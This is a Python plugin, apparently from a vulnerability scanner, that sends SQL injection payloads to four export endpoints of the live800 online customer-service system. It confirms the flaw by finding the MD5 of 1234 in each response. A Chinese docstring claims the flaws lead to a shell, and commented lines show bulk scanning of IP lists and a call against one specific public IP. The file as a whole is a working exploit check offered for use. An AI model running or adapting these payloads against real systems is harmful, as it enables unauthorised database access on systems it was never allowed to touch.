#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: live800在线客服系统多处SQL注入/GETSHELL漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0177871
author: Lucifer
description: http://domain/sta/export/referrerSta.jsp，
             http://domain/sta/export/chatTopicSta.jsp，
             http://domain/sta/export/chatHoursSta.jsp，
             http://domain/sta/export/chatUrlSta.jsp。四处存在SQL注入漏洞，可GETSHELL。
'''

import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    Medusas=[]
    try:
        headers = {
            "Referer": scheme + "://" + url + "/live800/sta/referrerTypeSta.jsp",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            'User-Agent': RandomAgent
        }
        payload = "/live800/sta/export/referrerSta.jsp"
        payload_url = scheme + "://" + url + payload
        post_data = {
            "export": "csv",
            "vn": "dataAnalyseAdapter_referrer",
            "operatorId": "",
            "fromTime": "2015-01-21",
            "toTime": "2016-05-22",
            "companyId": "1 Or 1=1",
            "subStrSql": "(SeLeCt Md5(1234))"
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在live800在线客服系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    try:
        headers = {
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding":"gzip, deflate",
            'User-Agent': RandomAgent
        }
        payload = "/live800/sta/export/chatTopicSta.jsp"
        payload_url = scheme + "://" + url + payload
        post_data = {
            "export":"csv",
            "vn":"dataAnalyseAdapter_topic",
            "operatorId":"",
            "fromTime":"2015-01-21",
            "toTime":"2016-05-22",
            "companyId":"1 Or 1=1",
            "subStrSql":"(SeLeCt Md5(1234))"
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在live800在线客服系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    try:
        headers = {
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding":"gzip, deflate",
            'User-Agent': RandomAgent
        }
        payload = "/live800/sta/export/chatHoursSta.jsp"
        payload_url = scheme + "://" + url + payload
        post_data = {
            "export":"csv",
            "vn":"dataAnalyseAdapter_close_reason",
            "operatorId":"",
            "fromTime":"2015-01-21",
            "toTime":"2016-05-22",
            "companyId":"1 Or 1=1",
            "subStrSql":"(SeLeCt Md5(1234))"
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在live800在线客服系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    try:
        headers = {
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding":"gzip, deflate",
            'User-Agent': RandomAgent
        }
        payload = "/live800/sta/export/chatUrlSta.jsp"
        payload_url = scheme + "://" + url + payload
        post_data = {
            "export":"csv",
            "vn":"dataAnalyseAdapter_url",
            "operatorId":"",
            "fromTime":"2015-01-21",
            "toTime":"2016-05-22",
            "companyId":"1 Or 1=1",
            "subStrSql":"(SeLeCt Md5(1234))"
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在live800在线客服系统SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,post_data)
            Medusas.append(str(Medusa))
    except Exception as e:
        pass
    return Medusas
#if __name__ == '__main__':
    # with open('1.txt', 'r') as f:
    #     for ip in f.readlines():
    #         ip = ip.strip()
    #         audit(assign('WWW', str(ip))[1])
    #medusa('54.37.131.33:8888',"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",'')